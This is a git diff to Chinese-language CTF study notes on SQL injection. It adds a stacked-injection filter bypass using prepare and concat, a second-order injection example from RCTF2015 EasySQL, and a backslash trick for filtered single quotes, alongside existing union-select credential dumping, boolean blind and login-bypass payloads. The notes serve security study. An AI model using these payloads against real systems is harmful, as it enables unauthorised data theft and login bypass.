@@ -1,12 +1,14 @@
 ## 常见
 
-| 考点                     |                                                                            |
-| ------------------------ | -------------------------------------------------------------------------- |
-| 0.测试                   | 1' order by 1 -- [123456] 测试                                             |
-| 1.联合查询               | union select group_concat(username,0x7e,password),2,3 from...，order by... |
-| [2.布尔盲注](#2布尔盲注) | if(ascii(substr(database(),1,1))>100,1,0)                                  |
-| [4.报错注入](#4报错注入) |                                                                            |
-| [5.堆叠注入](#5堆叠注入) |                                                                            |
+| 考点                          |                                                                            |
+| ----------------------------- | -------------------------------------------------------------------------- |
+| 0.测试                        | 1' order by 1 -- [123456] 测试                                             |
+| 1.联合查询                    | union select group_concat(username,0x7e,password),2,3 from...，order by... |
+| [2.布尔盲注](#2布尔盲注)      | if(ascii(substr(database(),1,1))>100,1,0)                                  |
+| [4.报错注入](#4报错注入)      |                                                                            |
+| [5.堆叠注入](#5堆叠注入)      | 使用 prepare 绕过                                                          |
+| 二次注入                      |
+| [过滤了单引号](#过滤了单引号) |
 
 ### 2.布尔盲注
 
@@ -36,7 +38,20 @@ ${id} = if(ascii(substr((select flag from flag),{},1))>{},1,2)
 
 ```sql
 select * from users where id= 1;create table test like users;
-1';set @t=concat('sel','ect flag from `1919810931114514`');prepare te from @t;execute te;#
+-1';set @t=concat('sel','ect flag from `1919810931114514`');prepare te from @t;execute te;#
+```
+### 二次注入
+`[RCTF2015]EasySQL`
+注册以下用户
+```sh
+admin"
+admin'
+admin')
+admin")
+```
+admin" 在修改密码时报错，说明"闭合 二次注入，猜测sql
+```sql
+update 表 set password='xxx' where username="xx" and pwd='xx'
 ```
 
 ## 常见的 SQL 注入考点 CTF-123458
@@ -106,6 +121,19 @@ payload：?username=admin' or '1'='1&password=123' or '1'='1
 替换后:   name='admin' or '1'='1' and passwd='123' or '1'='1';
 ```
 
+### 过滤了单引号
+
+```sql
+select * from users where  username= '$_POST["username"]' and password = '$_POST["username"]';
+```
+
+- username = <span class="red">1\\</span>
+- password = <span class="red"> or 1#</span>
+
+```sql
+select * from users where  username= '1\' and password =' or 1#
+```
+
 ### 万能密码
 
 有时不能为空（过滤了空字符）
@@ -127,3 +155,7 @@ fuzz 后能用
 "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
 # '0^(ascii(substr((select(flag)from(flag)),1,1))>94)'
 ```
+
+<style>
+ .red{color:red;}
+</style>
